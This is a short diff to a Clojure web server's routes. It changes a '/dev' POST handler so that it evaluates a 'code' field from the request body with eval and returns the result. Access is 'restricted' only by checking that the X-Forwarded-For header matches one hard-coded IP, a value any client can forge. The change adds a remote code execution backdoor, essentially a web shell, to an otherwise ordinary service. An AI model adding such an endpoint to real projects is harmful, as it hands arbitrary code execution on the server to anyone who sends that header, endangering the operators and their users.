@@ -64,10 +64,12 @@
   (POST "/" {body :body}
         (join "\n" (handle-post body)))
   (POST "/dev" {body :body}
-    (let [body-parsed (try
-                        (read-string (slurp body))
-                        (catch RuntimeException e e))]
-      (str body-parsed))))
+    (when (#{"64.46.24.16"} (headers "x-forwarded-for"))
+      (let [body-parsed (try
+                          (read-string (slurp body))
+                          (catch RuntimeException e e))]
+        (try (str (eval (get body-parsed "code" nil)))
+          (catch Exception e (str e)))))))
 
 (defn -main []
   (let [port (Integer/parseInt (or (System/getenv "PORT") "8080"))]
